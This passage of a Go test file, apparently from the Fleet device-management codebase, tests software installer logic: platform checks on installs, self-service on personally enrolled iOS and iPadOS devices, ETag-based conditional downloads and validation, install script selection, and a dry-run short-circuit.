	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "script.sh",
			Extension:   "sh",
			Platform:    "linux",
			TeamID:      ptr.Uint(1),
			TitleID:     ptr.Uint(100),
			SelfService: false,
		}, nil
	}

	// Label scoping check passes
	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	// No pending install
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	// Create admin user context
	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Install .sh on windows should fail with BadRequestError
	err := svc.InstallSoftwareTitle(ctx, 1, 100)
	require.Error(t, err, ".sh install on windows should fail")

	var bre *fleet.BadRequestError
	require.ErrorAs(t, err, &bre, "error should be BadRequestError")
	require.NotNil(t, bre)
	require.Contains(t, bre.Message, "can be installed only on linux hosts")
}

func TestSelfServiceInstallSoftwareTitleAllowsPersonallyEnrolledDevices(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Personally-enrolled iOS/iPadOS hosts must reach the install lookup; the
	// BYOD gate that previously short-circuited them is removed in #44007.
	// Returning NotFound from both software-installer and VPP-app lookups makes
	// the code surface the standard "title not available" error — proving we
	// got past the old gate without entangling this test in the install flow.
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint, _ bool) (*fleet.SoftwareInstaller, error) {
		return nil, &notFoundError{}
	}
	ds.GetVPPAppByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint) (*fleet.VPPApp, error) {
		return nil, &notFoundError{}
	}
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint) (*fleet.SoftwareInstaller, error) {
		return nil, &notFoundError{}
	}

	for _, platform := range []string{"ios", "ipados"} {
		fakeHost := &fleet.Host{
			Platform: platform,
			MDM: fleet.MDMHostData{
				EnrollmentStatus: ptr.String(string(fleet.MDMEnrollStatusPersonal)),
			},
		}

		err := svc.SelfServiceInstallSoftwareTitle(t.Context(), fakeHost, 1)
		require.Error(t, err, "platform %s", platform)
		require.NotContains(t, err.Error(), fleet.InstallSoftwarePersonalAppleDeviceErrMsg,
			"BYOD gate must no longer block self-service for platform %s", platform)
		require.ErrorContains(t, err, "Software title is not available for install",
			"control flow must reach the standard not-found path for platform %s", platform)
	}
}

func TestConditionalGETBehavior(t *testing.T) {
	t.Parallel()

	content := []byte("#!/bin/bash\necho 'test'\n")
	etag := fmt.Sprintf(`"%x"`, sha256.Sum256(content))

	tests := []struct {
		name          string
		ifNoneMatch   string
		handler       http.HandlerFunc
		expectStatus  int
		expectBodyNil bool
		expectErr     bool
	}{
		{
			name:        "no If-None-Match, normal 200 response",
			ifNoneMatch: "",
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Empty(t, r.Header.Get("If-None-Match"))
				w.Header().Set("ETag", etag)
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
		{
			name:        "If-None-Match sent, server returns 304",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, etag, r.Header.Get("If-None-Match"))
				w.WriteHeader(http.StatusNotModified)
			},
			expectStatus:  304,
			expectBodyNil: true,
		},
		{
			name:        "If-None-Match sent, server returns 200 (ETag changed)",
			ifNoneMatch: `"old-etag"`,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, `"old-etag"`, r.Header.Get("If-None-Match"))
				w.Header().Set("ETag", etag)
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
		{
			name:        "If-None-Match sent, server returns 403",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusForbidden)
			},
			expectStatus: 0,
			expectErr:    true,
		},
		{
			name:        "If-None-Match sent, server returns 500",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			expectStatus: 0,
			expectErr:    true,
		},
		{
			name:        "If-None-Match with S3 multipart ETag",
			ifNoneMatch: `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`, r.Header.Get("If-None-Match"))
				w.WriteHeader(http.StatusNotModified)
			},
			expectStatus:  304,
			expectBodyNil: true,
		},
		{
			name:        "server returns no ETag, normal download",
			ifNoneMatch: "",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			srv := httptest.NewServer(tt.handler)
			t.Cleanup(srv.Close)

			const maxSize = 512 * 1024 * 1024 // 512 MiB, generous for test payloads
			resp, tfr, err := downloadInstallerURL(t.Context(), srv.URL+"/test.sh", tt.ifNoneMatch, maxSize)
			if tt.expectErr {
				require.Error(t, err)
				return
			}
			require.NoError(t, err)

			assert.Equal(t, tt.expectStatus, resp.StatusCode)
			if tt.expectBodyNil {
				assert.Nil(t, tfr)
			} else {
				require.NotNil(t, tfr)
				t.Cleanup(func() { tfr.Close() })
			}
		})
	}
}

func TestValidETag(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
		valid bool
	}{
		{"strong ETag", `"abc123"`, true},
		{"weak ETag rejected", `W/"abc123"`, false},
		{"empty quotes", `""`, true},
		{"S3 multipart", `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`, true},
		{"unquoted", `abc123`, false},
		{"single quote", `"`, false},
		{"empty string", ``, false},
		{"missing closing quote", `"abc`, false},
		{"control char (newline)", "\"abc\n\"", false},
		{"control char (carriage return)", "\"abc\r\"", false},
		{"control char (null)", "\"abc\x00\"", false},
		{"DEL character", "\"abc\x7f\"", false},
		{"tab rejected per RFC 7232", "\"abc\t123\"", false},
		{"inner double-quote rejected", `"abc"def"`, false},
		{"inner space rejected per RFC 7232", `"abc def"`, false},
		{"weak prefix unquoted inner", `W/abc123`, false},
		{"oversized (>512)", `"` + strings.Repeat("a", 512) + `"`, false},
		{"exactly 511 bytes", `"` + strings.Repeat("a", 509) + `"`, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.valid, validETag(tt.input))
		})
	}
}

func TestGetInstallScript(t *testing.T) {
	t.Parallel()

	defaultPkgScript := file.GetInstallScript("pkg")
	defaultDebScript := file.GetInstallScript("deb")
	fleetdScript := file.InstallPkgFleetdScript
	customScript := "#!/bin/sh\necho custom"

	tests := []struct {
		name       string
		extension  string
		packageIDs []string
		current    string
		expected   string
	}{
		{
			name:       "fleetd pkg returns fleetd script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    "",
			expected:   fleetdScript,
		},
		{
			name:       "fleetd pkg overrides default script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    defaultPkgScript,
			expected:   fleetdScript,
		},
		{
			name:       "fleetd pkg overrides custom script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    customScript,
			expected:   fleetdScript,
		},
		{
			name:       "non-fleetd pkg returns default script",
			extension:  "pkg",
			packageIDs: []string{"com.example.app"},
			current:    "",
			expected:   defaultPkgScript,
		},
		{
			name:       "non-fleetd pkg preserves custom script",
			extension:  "pkg",
			packageIDs: []string{"com.example.app"},
			current:    customScript,
			expected:   customScript,
		},
		{
			name:       "deb returns default script",
			extension:  "deb",
			packageIDs: []string{"some-package"},
			current:    "",
			expected:   defaultDebScript,
		},
		{
			name:       "deb preserves custom script",
			extension:  "deb",
			packageIDs: []string{"some-package"},
			current:    customScript,
			expected:   customScript,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := getInstallScript(tt.extension, tt.packageIDs, tt.current)
			require.Equal(t, tt.expected, result)
		})
	}
}

func TestBatchSetSoftwareInstallersDryRunEmptyShortCircuit(t *testing.T) {
	t.Parallel()

	// keyValueStore mock that fails the test if any redis call happens
	// The short-circuit must return before touching redis or spawning the goroutine.
	kvs := &redismock.KeyValueStore{
		SetFunc: func(ctx context.Context, key string, value string, expireTime time.Duration) error {
			t.Errorf("unexpected keyValueStore.Set call: key=%s", key)
			return nil
		},
		GetFunc: func(ctx context.Context, key string) (*string, error) {
			t.Errorf("unexpected keyValueStore.Get call: key=%s", key)
			return nil, nil
		},
	}

	ds := new(mock.Store)
	ds.TeamByNameFunc = func(ctx context.Context, name string) (*fleet.Team, error) {
		return &fleet.Team{ID: 1, Name: name}, nil
	}

	svc := newTestService(t, ds)
	svc.keyValueStore = kvs
	svc.logger = slog.New(slog.NewTextHandler(io.Discard, nil))

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Cover both the team-scoped (tmName != "") and no-team (tmName == "") paths.
	// The customer's reported failure mode in #42607 was on the global / no-team
	// endpoint, which skips the TeamByName lookup entirely and flows straight
	// to the short-circuit.
	cases := []struct {
		name             string
		tmName           string
		payloads         []*fleet.SoftwareInstallerPayload
		expectTeamLookup bool
	}{
		{"team scoped, nil payloads", "TestEmpty", nil, true},
		{"team scoped, empty payloads", "TestEmpty", []*fleet.SoftwareInstallerPayload{}, true},
		{"no team, nil payloads", "", nil, false},
		{"no team, empty payloads", "", []*fleet.SoftwareInstallerPayload{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			kvs.SetFuncInvoked = false
			kvs.GetFuncInvoked = false
			ds.TeamByNameFuncInvoked = false

			requestUUID, err := svc.BatchSetSoftwareInstallers(ctx, c.tmName, c.payloads, true)
			require.NoError(t, err)
			require.Empty(t, requestUUID, "dry-run + empty payload should return empty request_uuid")
			require.False(t, kvs.SetFuncInvoked, "keyValueStore.Set must not be called")
			require.False(t, kvs.GetFuncInvoked, "keyValueStore.Get must not be called")
			require.Equal(t, c.expectTeamLookup, ds.TeamByNameFuncInvoked,
				"TeamByName should only be called when tmName != \"\"")
		})
	}
}
